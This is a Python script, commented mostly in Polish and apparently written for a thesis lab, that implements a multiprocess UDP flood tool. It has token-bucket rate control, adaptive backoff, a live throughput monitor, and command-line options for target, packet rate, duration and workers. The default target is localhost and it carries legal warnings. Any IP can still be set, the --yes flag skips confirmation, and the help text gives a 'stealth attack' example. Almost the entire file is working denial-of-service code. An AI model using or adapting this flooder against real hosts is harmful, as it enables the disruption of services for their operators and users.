#!/usr/bin/env python3
"""
UDP Flood Attack Simulator - Ultra Performance Edition
Based on: game_dc.py - Medyczny Emulator Obciążenia Stosu Sieciowego
Status: Kod Laboratoryjny / Akademicki (Praca Magisterska)

Architektura:
  - Multiprocessing (Lock-Free Emission)
  - Token Bucket Traffic Shaping
  - Non-blocking sockets + select()
  - Adaptive backoff
  - Real-time monitoring

⚠️  OSTRZEŻENIE: TYLKO testów bezpieczeństwa WŁASNYCH systemów!
"""

import errno
import os
import platform
import select
import signal
import socket
import sys
import time
import argparse
import multiprocessing
from datetime import datetime


# === PARAMETRYZACJA ARCHITEKTURY SIECIOWEJ ===
TARGET_IP = "127.0.0.1"  # DOMYŚLNIE LOCALHOST!
TARGET_PORT = 16000  # Port serwera
MAX_GLOBAL_PPS = 100000  # Przepustowość globalna (Packets Per Second)
PROCESS_COUNT = min(max(1, os.cpu_count() or 1), 8)  # Liczba workerów
PAYLOAD_SIZE = 500  # Rozmiar bufora danych

# === MECHANIZM TRAFFIC SHAPING (TOKEN BUCKET) ===
PPS_PER_WORKER = MAX_GLOBAL_PPS // PROCESS_COUNT
INTERVAL_SEC = 0.02  # 20ms -token bucket interval
TOKENS_PER_INTERVAL = max(1, int(PPS_PER_WORKER * INTERVAL_SEC))

# === ADAPTIVE BACKOFF ===
MIN_BACKOFF_SEC = 0.0005
MAX_BACKOFF_SEC = 0.05
BACKOFF_MULTIPLIER = 2.0
ERROR_CIRCUIT_BREAKER = 50

# === BUFFER CONFIGURATION ===
DEFAULT_SNDBUF = 256 * 1024


def configure_send_buffer(sock):
    """Ustawia SO_SNDBUF w sposób bezpieczny dla Windows/Linux"""
    size = DEFAULT_SNDBUF
    if platform.system().lower().startswith("win"):
        size = min(DEFAULT_SNDBUF, 256 * 1024)
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, size)
    except OSError:
        pass

    try:
        actual = sock.getsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF)
        if actual < size:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, actual)
    except OSError:
        pass


def wait_until_writable(sock, timeout):
    """Czekaj na gotowość zapisu do gniazda zamiast busy-wait"""
    try:
        _, writable, _ = select.select([], [sock], [], timeout)
        return bool(writable)
    except OSError:
        return False


def ultra_performance_worker(
    worker_id, target_ip, target_port, stop_event, shared_stats, duration
):
    """
    Proces roboczy (Worker) realizujący niskopoziomową emisję UDP.
    Działa w modelu izolacji pamięci podręcznej (brak rywalizacji o Locki).
    """
    signal.signal(signal.SIGINT, signal.SIG_IGN)

    payload = b"X" * PAYLOAD_SIZE
    target_addr = (target_ip, target_port)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(False)
    configure_send_buffer(sock)

    accumulated_sent = 0
    consecutive_errors = 0
    backoff = MIN_BACKOFF_SEC
    start_time = time.perf_counter()

    while not stop_event.is_set():
        elapsed = time.perf_counter() - start_time
        if elapsed > duration:
            break

        interval_start = time.perf_counter()
        tokens = TOKENS_PER_INTERVAL
        packets_sent_this_interval = 0

        while tokens > 0 and not stop_event.is_set():
            try:
                sock.sendto(payload, target_addr)
                packets_sent_this_interval += 1
                tokens -= 1
                consecutive_errors = 0
                backoff = MIN_BACKOFF_SEC
            except BlockingIOError:
                consecutive_errors += 1
                wait_time = min(MAX_BACKOFF_SEC, backoff)
                if wait_until_writable(sock, wait_time):
                    backoff = MIN_BACKOFF_SEC
                    continue
                time.sleep(wait_time)
                backoff = min(MAX_BACKOFF_SEC, backoff * BACKOFF_MULTIPLIER)
            except OSError as exc:
                consecutive_errors += 1
                if exc.errno in (
                    errno.ENOBUFS,
                    errno.EAGAIN,
                    errno.ENOMEM,
                    errno.ENETDOWN,
                    errno.EHOSTDOWN,
                ):
                    if consecutive_errors >= ERROR_CIRCUIT_BREAKER:
                        time.sleep(MAX_BACKOFF_SEC)
                        backoff = MAX_BACKOFF_SEC
                    else:
                        time.sleep(backoff)
                        backoff = min(MAX_BACKOFF_SEC, backoff * BACKOFF_MULTIPLIER)
                else:
                    time.sleep(MIN_BACKOFF_SEC)
                if consecutive_errors >= ERROR_CIRCUIT_BREAKER:
                    consecutive_errors = 0

        accumulated_sent += packets_sent_this_interval

        # Update statystyk co 1000 pakietów
        if accumulated_sent >= 1000:
            with shared_stats.get_lock():
                shared_stats.value += accumulated_sent
            accumulated_sent = 0

        # Regulatory tick
        elapsed_interval = time.perf_counter() - interval_start
        sleep_time = INTERVAL_SEC - elapsed_interval
        if sleep_time > 0:
            time.sleep(sleep_time)

    # Final flush
    if accumulated_sent > 0:
        with shared_stats.get_lock():
            shared_stats.value += accumulated_sent

    sock.close()


def monitor(shared_stats, stop_event, duration):
    """
    Monitor telemetryczny.
    Oblicza przepustowość z uwzględnieniem pełnej enkapsulacji warstwy fizycznej.
    """
    last_count = 0
    start_telemetry_time = time.time()

    while not stop_event.is_set():
        try:
            time.sleep(1)
        except KeyboardInterrupt:
            break

        with shared_stats.get_lock():
            current_total = shared_stats.value

        pps = current_total - last_count

        # Wire Size (Ethernet L1+L2 overhead):
        # Payload + UDP(8) + IPv4(20) + Eth_Frame(18) + L1_Preamble(20) = +66
        wire_packet_size = PAYLOAD_SIZE + 66
        mbps = (pps * wire_packet_size * 8) / 1_000_000
        last_count = current_total
        elapsed_total = time.time() - start_telemetry_time

        remaining = duration - elapsed_total

        os.system("cls" if os.name == "nt" else "clear")
        print("=" * 70)
        print("  UDP FLOOD - ULTRA PERFORMANCE EDITION")
        print("=" * 70)
        print(f"Target                       : {TARGET_IP}:{TARGET_PORT} [UDP]")
        print(f"Workers (Processes)          : {PROCESS_COUNT} równoległych instancji")
        print(f"Global PPS Limit             : {MAX_GLOBAL_PPS:,} pakietów/s")
        print(f"Token Bucket Interval        : {INTERVAL_SEC*1000:.1f} ms")
        print("-" * 70)
        print(f"Current PPS                  : {pps:,} packets/sec")
        print(f"Bandwidth (L1/L2 Wire)       : {mbps:.2f} Mbps")
        print(f"Total Packets Sent           : {current_total:,}")
        print(
            f"Total Data Sent              : {(current_total * PAYLOAD_SIZE) / 1024 / 1024:.2f} MB"
        )
        print(
            f"Elapsed Time                 : {elapsed_total:.1f}s / Remaining: {remaining:.1f}s"
        )
        print("-" * 70)
        print("Status: 🔥 Transmisja stabilna. Lock-Free Emission Active.")
        print("        Naciśnij Ctrl+C aby bezpiecznie zakończyć atak.")
        print("=" * 70)


def print_warning():
    """Print warning"""
    print(
        """
╔══════════════════════════════════════════════════════════════════════╗
║                  ⚠️  OSTRZEŻENIE - ALPHA VERSION  ⚠️                 ║
╠══════════════════════════════════════════════════════════════════════╣
║  Ultra-Performance UDP Flood Simulator                              ║
║                                                                      ║
║  LEGALNE TYLKO DO: Testowania WŁASNYCH systemów                     ║
║  Atakowanie bez zgody = NIELEGALNE i będzie karane!                 ║
║                                                                      ║
║  Domyślnie: localhost (127.0.0.1) - BEZPIECZNE DO TESTÓW            ║
╚══════════════════════════════════════════════════════════════════════╝
"""
    )


def parse_args():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description="UDP Flood Attack Simulator - Ultra Performance Edition",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Localhost attack (safe)
  python udp_flood_client.py --target 127.0.0.1 --pps 100000 --duration 10

  # Custom configuration
  python udp_flood_client.py --target 127.0.0.1 --pps 500000 --duration 60 --workers 4

  # Stealth attack
  python udp_flood_client.py --target 127.0.0.1 --pps 10000 --duration 300
""",
    )

    parser.add_argument(
        "--target", default=TARGET_IP, help=f"Target IP (default: {TARGET_IP})"
    )
    parser.add_argument(
        "--port",
        type=int,
        default=TARGET_PORT,
        help=f"Target port (default: {TARGET_PORT})",
    )
    parser.add_argument(
        "--pps",
        type=int,
        default=MAX_GLOBAL_PPS,
        help=f"Packets per second (default: {MAX_GLOBAL_PPS:,})",
    )
    parser.add_argument(
        "--duration",
        type=int,
        default=10,
        help="Attack duration in seconds (default: 10)",
    )
    parser.add_argument(
        "--workers",
        type=int,
        default=PROCESS_COUNT,
        help=f"Number of worker processes (default: {PROCESS_COUNT})",
    )
    parser.add_argument(
        "--size",
        type=int,
        default=PAYLOAD_SIZE,
        help=f"Payload size in bytes (default: {PAYLOAD_SIZE})",
    )
    parser.add_argument("--yes", action="store_true", help="Skip confirmation")

    return parser.parse_args()


def main():
    """Main program"""

    args = parse_args()

    # Override globals
    global TARGET_IP, TARGET_PORT, MAX_GLOBAL_PPS, PROCESS_COUNT, PAYLOAD_SIZE
    TARGET_IP = args.target
    TARGET_PORT = args.port
    MAX_GLOBAL_PPS = args.pps
    PROCESS_COUNT = min(max(1, args.workers), 8)
    PAYLOAD_SIZE = args.size

    print_warning()

    print(f"\n{'='*70}")
    print("  ATTACK CONFIGURATION")
    print(f"{'='*70}")
    print(f"Target IP:Port               : {TARGET_IP}:{TARGET_PORT}")
    print(f"Global PPS Limit             : {MAX_GLOBAL_PPS:,}")
    print(f"Worker Processes             : {PROCESS_COUNT}")
    print(f"PPS per Worker               : {MAX_GLOBAL_PPS // PROCESS_COUNT:,}")
    print(f"Payload Size                 : {PAYLOAD_SIZE} bytes")
    print(f"Duration                     : {args.duration}s")

    total_packets_est = MAX_GLOBAL_PPS * args.duration
    total_mb = (total_packets_est * PAYLOAD_SIZE) / 1024 / 1024
    wire_size = PAYLOAD_SIZE + 66
    mbps_est = (total_packets_est * wire_size * 8) / (args.duration * 1_000_000)

    print("\nEstimated Results:")
    print(f"  Total Packets              : {total_packets_est:,}")
    print(f"  Total Data                 : {total_mb:.2f} MB")
    print(f"  Bandwidth (L1/L2)          : {mbps_est:.2f} Mbps")
    print(f"{'='*70}\n")

    if not args.yes:
        if args.target == "127.0.0.1":
            response = (
                input("✅ Atakujesz LOCALHOST (bezpieczne). Kontynuować? (y/n): ")
                .strip()
                .lower()
            )
        else:
            response = (
                input(
                    f"❌ OSTRZEŻENIE: Będziesz atakować {args.target}:{args.port}!\n"
                    f"   Potwierdzasz? (y/n): "
                )
                .strip()
                .lower()
            )

        if response != "y":
            print("Anulowano.")
            sys.exit(0)

    # Start attack
    print(f"🔥 Starting attack at {datetime.now().strftime('%H:%M:%S')}\n")

    total_packets = multiprocessing.Value("Q", 0)
    stop_event = multiprocessing.Event()

    workers = []
    for i in range(PROCESS_COUNT):
        p = multiprocessing.Process(
            target=ultra_performance_worker,
            args=(i, TARGET_IP, TARGET_PORT, stop_event, total_packets, args.duration),
        )
        p.daemon = True
        p.start()
        workers.append(p)

    try:
        monitor(total_packets, stop_event, args.duration)
    except KeyboardInterrupt:
        print("\n\n[-] Przechwycono sygnał zamknięcia (SIGINT)...")
    finally:
        stop_event.set()

        for w in workers:
            if w.is_alive():
                w.terminate()
                w.join()

        with total_packets.get_lock():
            final_count = total_packets.value

        print(f"\n{'='*70}")
        print("  ATTACK COMPLETED")
        print(f"{'='*70}")
        print(f"✅ Total packets sent: {final_count:,}")
        print(f"✅ Attack stopped at {datetime.now().strftime('%H:%M:%S')}")
        print("\n💡 Obserwuj wyniki ataku na serwerze:")
        print("   python continuous_protocol_test.py")
        print(f"{'='*70}\n")

        sys.exit(0)


if __name__ == "__main__":
    main()
